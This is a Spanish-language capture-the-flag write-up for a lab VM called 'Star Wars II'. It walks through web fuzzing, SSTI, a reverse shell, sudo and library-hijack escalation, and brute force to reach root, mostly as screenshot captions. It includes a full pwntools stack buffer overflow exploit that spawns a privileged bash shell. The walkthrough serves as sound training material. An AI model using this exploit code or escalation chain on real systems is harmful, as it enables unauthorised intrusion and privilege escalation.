<img src="https://github.com/dherediat97/CyberWriteUps/blob/main/img/hackerlabs/star_warsII.png">

# Resolución del CTF

| Propiedad | Valor |
|---	|---	|
| Máquina | Star Wars II |
| Entorno | OVA Linux      |
| Dificultad | Profesional   |
| Fecha | 27/06/2026     |
| Tipo | Seguridad Ofensiva, Linux |
| Autor | dherediat      |

# Introducción

### Iniciamos la maquina descargada, y notamos que el creador del CTF(yo) nos ha proporcionado la IP de la máquina objetivo de este CTF. En mi caso es la ``10.0.1.7``
![](images/star_wars_II_1.png)

### Hacemos ping a la máquina objetivo y comprobamos si hay conexión directa desde nuestra máquina atacante.
![](images/star_wars_II_2.png)

### Más tarde, vemos que la máquina objetivo tiene ``3 servicios abiertos``, vamos a echar un vistazo al servicio web. Para ello, abrimos el navegador predeterminado por defecto.

![](images/star_wars_II_3.png)

### Accedemos a la IP(``10.0.1.7``) con el puerto http por defecto(80) y nos redirige a un dominio a un virtual host.

![](images/star_wars_II_4.png)

### Lo apuntamos...

![](images/star_wars_II_5.png)

### Vemos la típica introducción de starwars, presenciamos el espectacúlo.

![](images/star_wars_II_6.png)

### Hacemos el típico fuzzing por si hay algo oculto.

![](images/star_wars_II_7.png)

### Y resulta que si, que tenemos un wordpress. Nos redirige a un subdominio 'wp'.

![](images/star_wars_II_8.png)

### Apuntamos el subdominio...

![](images/star_wars_II_9.png)

### Vemos un blog como si fuera de la estrella de la muerte, pero recordamos que ya esta destruida en este episodio. Será, que lo dejaron como copia de seguridad.

![](images/star_wars_II_10.png)

> [!TIP]
> Ceros y unos bajando al estilo Matrix, me da a mi que no son simples 1 y 0.

### Vemos el código fuente, a ver que contiene.

![](images/star_wars_II_11.png)

### Y en el archivo matrix-pill.js, está el código en binario.

![](images/star_wars_II_12.png)

### Vemos que en el código fuente está guardado algo encriptado. También vemos que hace mención a un esclavista mandaloriano

![](images/star_wars_II_11.png)

### En base64 significa ese valor.

![](images/star_wars_II_13.png)

### No todo queda ahi, en dos datos sin correlacción, ¿que significará lo del esclavista mandaloriano?

![](images/star_wars_II_14_2.png)

### Interesante, es un XOR, procedemos a hacer esta operación especial.

![](images/star_wars_II_14.png)

### Más interesante aún si cabe, tenemos unas credenciales no sabemos de que pero las tenemos.

![](images/star_wars_II_15.png)

### Vamos a hacer una cosa, ya que habia 3 servicios, 1 de ellos es el http, el otro el ftp y el último el ssh. Ya que sabemos que hay subdominios, al menos el que encontro, probemos a conectarnos al ftp por si hay alguna pista.

![](images/star_wars_II_16.png)

### Nos descargamos los dos ficheros y probamos hacer fuzzing con subdominios

![](images/star_wars_II_17.png)

### Ves, ves como había algo

![](images/star_wars_II_18.png)

### Coincide con el numero de la contraseña

![](images/star_wars_II_19.png)

### Lo añadimos.

![](images/star_wars_II_20.png)

### Accedemos a el y nos pide contraseña

![](images/star_wars_II_21.png)

### Erramos, 'admin' no es, pero y si es 'lando'.

![](images/star_wars_II_22.png)

### ¡Acertamos! Vemos un web de videovigilancia bastante guapa.

![](images/star_wars_II_23.png)

### Vemos que oculta algo

![](images/star_wars_II_24.png)

### Una web oculta. Interesante

![](images/star_wars_II_25.png)

### Un form oculto y que se debe de enviar por POST. Interesante

![](images/star_wars_II_26.png)

### Nos guardamos el bearer.

![](images/star_wars_II_27.png)

### Probamos a conectarnos con el token.

![](images/star_wars_II_28.png)

### Probamos si la web es vulnerable, con el campo oculto 'payload'

![](images/star_wars_II_29.png)

### Podría no serlo, pero es un poco raro que envie lo que recibe, miremos si funciona el SSTI.

![](images/star_wars_II_30.png)

### Enviamos este payload para adivinar el usuario logueado. Y vemos que es www-data, tenemos que montar una reverse shell, es muy probable, que podamos meternos.

![](images/star_wars_II_31.png)

### Conectamos la parte servidora.

![](images/star_wars_II_32.png)

### Probamos a conectarnos usando busybox.

![](images/star_wars_II_33.png)

### ¡Y funciono!

![](images/star_wars_II_34.png)

### Miremos el sudo -l, tenemos que escalar entonces con php.

![](images/star_wars_II_35.png)

### Miramos nuestra config del stty.

![](images/star_wars_II_36.png)

### Y lo configuramos.

![](images/star_wars_II_37.png)

### Ejecutamos el comando requerido para escalar usando el que viene especificado en 'el sudo -l'.

![](images/star_wars_II_38.png)

### Ya estamos dentro

![](images/star_wars_II_39.png)

### Seguimos escalando, ahora a Chewbacca, parece que es un path library hijacking, con python. 

![](images/star_wars_II_40.png)

### Y así, sabremos que librería le hace falta, y en que ruta.

![](images/star_wars_II_41.png)

### La escribimos

![](images/star_wars_II_42.png)

### A mi, me ha ocurrido que el nano no iba, y me la he tenido que pasar, porque el stty entre otras cosas, no funcionaba bien y he tenido que optar por el scp.

![](images/star_wars_II_43.png)

### Ya somos Chewbacca, pero de manera temporal y en este write-up optaré por hacerlo de la manera fácil.

![](images/star_wars_II_44.png)

### Vemos que no funciona el sudo -l
![](images/star_wars_II_45.png)

### Nos conectamos con otra reverse shell

![](images/star_wars_II_47.png)

### Vemos un archivo muy suculento, que tiene su ejecutable.

![](images/star_wars_II_48.png)
![](images/star_wars_II_49.png)

### Aquí podemos ver los permisos, son de la mar interesantes...

![](images/star_wars_II_50.png)

## Código que explota el BOF y consigue escalar a Luke Skywalker

```python

#!/usr/bin/env python3
import time
import sys
from pwn import *

context.log_level = 'error'
 
# ==============================================================================
# CINEMÁTICA DE INICIO
# ==============================================================================
print(chr(27) + "[2J") # Limpiar pantalla de forma limpia
print("\033[1;33m" + "="*80 + "\033[0m")
print("\033[1;33m     STAR LAUNCHER - TERMINAL DE ASISTENCIA TÁCTICA DE LA REBELIÓN v5.0\033[0m")
print("\033[1;33m" + "="*80 + "\033[0m\n")
 
def animar_log(mensaje, duracion=1.5, tipo="info"):
    """Crea una barra de carga animada para dar un efecto dramático e informático."""
    iconos = {
        "info": "\033[1;34m[*]\033[0m", 
        "ok": "\033[1;32m[+]\033[0m", 
        "alert": "\033[1;31m[!]\033[0m"
    }
    icono = iconos.get(tipo, "[*]")
     
    pasos = ["|", "/", "-", "\\"]
    fin = time.time() + duracion
    i = 0
    while time.time() < fin:
        sys.stdout.write(f"\r{icono} {mensaje} {pasos[i % len(pasos)]}")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write(f"\r{icono} {mensaje} ... \033[1;32mHECHO\033[0m\n")
    sys.stdout.flush()
 
# ==============================================================================
# CONFIGURACIÓN DEL ENTORNO
# ==============================================================================
exe = '/home/chewbacca/almacen_wookie/hyperdrive'
elf = context.binary = ELF(exe, checksec=False)
 
animar_log("Localizando matriz de memoria del Halcón Milenario", 1.2)
p = process(exe)
 
# ==============================================================================
# RECONOCIMIENTO DE MEMORIA
# ==============================================================================
addr_win = elf.symbols['take_xwing_controls']
 
# CORRECCIÓN: Extraemos la propiedad .address para convertir el objeto Gadget en un entero
gadget_ret_obj = ROP(elf).find_gadget(['ret'])
gadget_ret = gadget_ret_obj.address
 
animar_log("Calculando vector de salto al sistema del X-Wing", 1.0)
print(f"    \033[1;36m└─► Función de control [take_xwing_controls] hallada en: {hex(addr_win)}\033[0m")
print(f"    \033[1;36m└─► Estabilizador de pila de 64 bits [RET] hallado en:  {hex(gadget_ret)}\033[0m")
 
# ==============================================================================
# CONSTRUCCIÓN DEL PAYLOAD TÁCTICO
# ==============================================================================
offset = 72  
 
animar_log("Ensamblando secuencia de anulación wookie (Payload)", 1.5)
payload = b"A" * offset
payload += p64(gadget_ret)  # Ahora se empaqueta correctamente como entero
payload += p64(addr_win)    # Dirección de la función ganadora
 
# ==============================================================================
# LANZAMIENTO DEL EXPLOIT (INYECCIÓN DE POTENCIA)
# ==============================================================================
print("\n\033[1;31m[!] INICIANDO MANIOBRA DE DESBORDAMIENTO DE PILA\033[0m")
animar_log("Accediendo al bypass del motivador del hipermotor (Opción 2)", 0.8)
p.sendlineafter(b"> ", b"2")
 
animar_log("Inyectando sobrecarga de amperaje en los relés de cobre", 2.0, "alert")
p.sendlineafter(b"You wedge a stripped wire into the panel): ", payload)
 
print("\n\033[1;32m[+] ¡BOOM! Conexión forzada. Cortocorticuitando privilegios del sistema...\033[0m")
print("\033[1;35m[INFO] Puente cuántico establecido. Disparando post-combustión en el hangar...\033[0m")
print("\033[1;35m[INFO] Cambiando el identificador de usuario activo a: RED_FIVE (Luke Skywalker)\033[0m\n")
 
print("\033[1;32m" + "="*80 + "\033[0m")
print("\033[1;32m[OK] INTERFAZ TÁCTICA TRANSFERIDA. LOS MANDOS DEL X-WING SON TUYOS, LUKE.\033[0m")
print("\033[1;32m" + "="*80 + "\033[0m\n")
 
# ==============================================================================
# TRANSFERENCIA DE MANDOS (ESTABILIZACIÓN Y SHELL INTERACTIVA)
# ==============================================================================
print("\033[1;35m[INFO] Sincronizando identificadores de usuario y grupo para Luke...\033[0m")
 
p.sendline(b'python3 -c "import os; os.setregid(1006, 1006); os.setreuid(1006, 1006); os.system(\'/bin/bash -p\')"')
 
time.sleep(0.5)
 
print("\033[1;32m[OK] IDENTIDAD SANEADA. SESIÓN ESTABILIZADA AL 100% COMO LUKE SKYWALKER.\033[0m\n")
 
p.interactive()

```

### Metemos el archivo que da la solución a esta parte. Abuso de un bof, y puedo pasar
![](images/star_wars_II_51.png)

### Aquí, se puede ver como he conseguido escalar.
![](images/star_wars_II_53.png)

### Dentro de luke, vemos archivos interesantes... Buscamos usando OSINT, por segunda vez, si existe un repositorio público llamado así.
![](images/star_wars_II_54.png)

### Y si existe, y lo creo el mismo Lando.
![](images/star_wars_II_55.png)

### ¡Ups! Se ha filtrado la password
![](images/star_wars_II_57.png)

### Vemos todos los usuarios con el passwd
![](images/star_wars_II_58.png)

### Creamos una lista
![](images/star_wars_II_59.png)

### Atacamos usando la fuerza bruta
![](images/star_wars_II_61.png)

### Impresionante! Ya somos Darth Vader
![](images/star_wars_II_62.png)

### Aquí está la ansiada flag
![](images/star_wars_II_63.png)

### Ejecutamos el comando que nos decía en en el `sudo -l`
![](images/star_wars_II_64.png)

### Escalamos a `Emperador Palpatine` y vemos el siguiente paso usando  `sudo -l`
![](images/star_wars_II_65.png)

### Usamos el `sed` como lo describe `gtfobins`.
![](images/star_wars_II_66.png)

### ¡Conseguimos entrar como root, y ya tenemos acceso a la flag de root!
![](images/star_wars_II_67.png)


> [!TIP] 
> Extra: continuar fuzzeando sin pasar por el blog ni la web de videovigilancia.


# ¡Felicidades! ¡La fuerza te acompañó y pudistes acabar este CTF con éxito!

![](https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExN3EyNWFzcGM5dHNyMmZicXg1ZXJqd3hxb2dkeWtvc3VsN2U3cWU4dyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/26FL0ydLDEcARWY0g/giphy.gif)


> [!TIP] 
> Te animo, a que la rehagas, que vayas por otro camino, que investigues y encuentres más caminos.